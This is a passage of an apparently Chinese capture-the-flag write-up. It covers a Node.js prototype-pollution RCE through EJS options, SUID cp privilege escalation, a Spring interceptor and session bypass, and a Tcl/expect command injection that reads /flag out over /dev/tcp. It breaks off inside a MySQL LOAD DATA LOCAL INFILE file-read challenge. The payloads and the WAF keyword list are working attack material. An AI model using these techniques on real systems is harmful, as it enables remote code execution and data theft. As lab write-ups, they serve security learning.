<span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>oldFileName <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newFileName <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>uuid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        oldFileName <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>oldFileName        newFileName <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newFileName        uuid <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>uuid        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span>oldFileName<span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">waf</span><span class="token punctuation">(</span>newFileName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>  <span class="token function">waf</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            uniqueFileName <span class="token operator">=</span> <span class="token function">findKeyByValue</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">,</span>oldFileName<span class="token punctuation">)</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueFileName <span class="token operator">==</span> uuid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">putil_merge</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>uuid<span class="token punctuation">]</span><span class="token operator">:</span>newFileName<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>newFileName<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'文件重命名失败！！！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>__dirname<span class="token operator">+</span><span class="token string">"/uploads/"</span><span class="token operator">+</span>oldFileName<span class="token punctuation">,</span> __dirname<span class="token operator">+</span><span class="token string">"/uploads/"</span><span class="token operator">+</span>newFileName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'文件重命名失败！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'文件重命名成功！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'文件重命名失败！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'哒咩哒咩！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'文件重命名失败！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">findKeyByValue</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> targetValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> targetValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> key<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// 如果未找到匹配的键名，返回null或其他标识</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'outputFunctionName'</span><span class="token punctuation">)</span> <span class="token operator">||</span> data<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'escape'</span><span class="token punctuation">)</span> <span class="token operator">||</span> data<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'delimiter'</span><span class="token punctuation">)</span> <span class="token operator">||</span> data<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'localsName'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//设置http</span><span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-原型链污染-destructuredLocals"><a href="#3-原型链污染-destructuredLocals" class="headerlink" title="3. 原型链污染 destructuredLocals"></a>3. 原型链污染 destructuredLocals</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">putil_merge</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>fileDictionary<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>uuid<span class="token punctuation">]</span><span class="token operator">:</span>newFileName<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">deep</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>在 rename 处修改 request json 污染原型链</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token property">"newFileName"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"client"</span><span class="token operator">:</span> True<span class="token punctuation">,</span>                <span class="token property">"destructuredLocals"</span><span class="token operator">:</span> <span class="token punctuation">[</span>f<span class="token string">"x;global.process.mainModule.constructor._load('child_process').execSync('cmd');//"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"compileDebug"</span><span class="token operator">:</span> True            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span></code></pre><p>通过 cmd 输出到文件 + 任读回显 cmd</p><h3 id="4-linux-提权"><a href="#4-linux-提权" class="headerlink" title="4. linux 提权"></a>4. linux 提权</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre><p>得到 suid</p><pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;bin&#x2F;mount&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;umount&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;cp&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;su</code></pre><p>发现 cp 具有 suid 权限</p><p>cp 到 &#x2F;home&#x2F;node 即可读取</p><h1 id="ezinject"><a href="#ezinject" class="headerlink" title="ezinject"></a>ezinject</h1><h2 id="1-git-泄露"><a href="#1-git-泄露" class="headerlink" title="1. .git 泄露"></a>1. .git 泄露</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> githacker <span class="token parameter variable">--url</span> http://1.14.108.193:32756/.git/ --output-folder result</code></pre><p>得到一个 easy_java1 的项目源码：easy_java1.zip</p><p>确认 git 中不再有敏感信息</p><p><img src="image-2.png" alt="image-2.png"></p><h2 id="2-绕过-interceptor"><a href="#2-绕过-interceptor" class="headerlink" title="2. 绕过 interceptor"></a>2. 绕过 interceptor</h2><p>config 中存在 <code>MyInterceptor</code> 拦截器</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// MyInterceptor.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>easy_java1<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> url<span class="token operator">=</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".css"</span><span class="token punctuation">)</span><span class="token operator">||</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".js"</span><span class="token punctuation">)</span><span class="token operator">||</span>url<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">||</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/.git"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// Config.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>easy_java1<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">InterceptorRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurer</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在 <code>/**</code> 路由处应用 <code>MyInterceptor</code> 拦截器</p><p>仅允许以下路由通过：</p><ul><li>以 <code>.css</code> 结尾的路由</li><li>以 <code>.js</code> 结尾的路由</li><li><code>/</code> 路由</li><li>以 <code>/.git</code> 开头的路由</li></ul><p>可以通过 <code>/login;.css</code> 绕过 interceptor</p><h2 id="3-服务端-session-绕过"><a href="#3-服务端-session-绕过" class="headerlink" title="3. 服务端 session 绕过"></a>3. 服务端 session 绕过</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>easy_java1<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>easy_java1<span class="token punctuation">.</span>util<span class="token punctuation">.</span>shellUtil</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpSession</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> router <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> isLogin <span class="token operator">=</span>  session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"isLogin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            username<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>isLogin<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"agent"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> ua <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ua<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"client"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(\"%s\");window.location.href=\"/\"&lt;/script>"</span><span class="token punctuation">,</span><span class="token string">"client user suspended Login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(\"%s\");window.location.href=\"/\"&lt;/script>"</span><span class="token punctuation">,</span><span class="token string">"unknown user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"loginOk"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"&lt;script>window.location.href=\"/\"&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"loginOk"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"&lt;script>window.location.href=\"/\"&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert(\"%s\");window.location.href=\"/\"&lt;/script>"</span><span class="token punctuation">,</span><span class="token string">"unknown user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/exec"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">,</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"loginOk"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"access denied"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        shellUtil<span class="token punctuation">.</span><span class="token function">runCommand</span><span class="token punctuation">(</span><span class="token string">"/app/runexpect.sh /app/expect/ /app/expect/expect /app/call.sh 1 "</span><span class="token operator">+</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>要通过 <code>/exec</code> 路由执行命令需要满足 <code>session.getAttribute(&quot;loginOk&quot;)!=null</code></p><p>由于只要不是 <code>null</code> 就行，我们可以通过手动触发报错来使得 <code>session.setAttribute(&quot;loginOk&quot;,false);</code></p><p>由于要先进入 <code>ua.contains(&quot;client&quot;)</code> 才能触发报错，所以需要先设置 param <code>?username=agent</code></p><p>然后去掉 Request 中的 <code>User-Agent</code> 触发报错即可获得 exec 权限</p><h2 id="4-命令注入"><a href="#4-命令注入" class="headerlink" title="4. 命令注入"></a>4. 命令注入</h2><p>command 的调用路径如下：</p><p>shellUtil.java</p><pre class="language-java" data-language="java"><code class="language-java">process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>runexpect.sh</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment"># Set LD_LIBRARY_PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token builtin class-name">echo</span> <span class="token string">"Assuming LD_LIBRARY_PATH in runexpect :"</span> <span class="token variable">$LD_LIBRARY_PATH</span><span class="token builtin class-name">shift</span><span class="token builtin class-name">echo</span> <span class="token string">"Running command: <span class="token variable">$*</span>"</span><span class="token variable">$*</span><span class="token builtin class-name">exit</span> <span class="token variable">$?</span></code></pre><p>call.sh</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/tclsh</span><span class="token builtin class-name">set</span> password <span class="token punctuation">[</span>lindex <span class="token variable">$argv</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token builtin class-name">set</span> <span class="token function">host</span> <span class="token punctuation">[</span>lindex <span class="token variable">$argv</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token builtin class-name">set</span> port <span class="token punctuation">[</span>lindex <span class="token variable">$argv</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin class-name">set</span> <span class="token function">dir</span> <span class="token punctuation">[</span>lindex <span class="token variable">$argv</span> <span class="token number">3</span><span class="token punctuation">]</span>puts <span class="token variable">$argv</span><span class="token builtin class-name">eval</span> spawn <span class="token function">ssh</span> <span class="token parameter variable">-p</span> <span class="token variable">$port</span> <span class="token variable">$host</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-d</span> <span class="token variable">$dir</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> exists<span class="token function">expect</span> <span class="token string">"*(yes/no*)?*$"</span> <span class="token punctuation">&#123;</span> send <span class="token string">"yes<span class="token entity" title="\n">\n</span>"</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">set</span> <span class="token function">timeout</span> <span class="token number">600</span><span class="token function">expect</span> <span class="token string">"*assword:*$"</span> <span class="token punctuation">&#123;</span> send <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span>"</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token function">timeout</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">set</span> <span class="token function">timeout</span> <span class="token parameter variable">-1</span><span class="token function">expect</span> <span class="token string">"<span class="token entity" title="\\">\\</span>$ $"</span></code></pre><p>传入 command ：</p><pre class="language-none"><code class="language-none">echo  [system &#39;&#96;cat&lt;&#x2F;flag&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;80&#96;&#39;|bash]</code></pre><p>最终组合成：</p><pre class="language-none"><code class="language-none">eval spawn ssh -p [system echo test -d &#39;&#96;cat&lt;&#x2F;flag&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;80&#96;&#39;|bash]</code></pre><p>获得 flag</p><h1 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="language-none"><code class="language-none">说了随便连啦就是随便连，你输什么我都不管的。Hint：LOAD DATA</code></pre><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-MySQL-读客户端文件"><a href="#1-MySQL-读客户端文件" class="headerlink" title="1. MySQL 读客户端文件"></a>1. MySQL 读客户端文件</h3><p>在自己的 server 上创建一个 mysql 服务端并创建一个数据库和数据表 TestTable</p><p>数据表里面放置一列 Text 类型数据列</p><p>然后在靶机上连接自己的 mysql 服务端并使用刚创建的数据库来远程读客户端文件</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">load</span> <span class="token keyword">data</span> <span class="token keyword">local</span> <span class="token keyword">infile</span> <span class="token 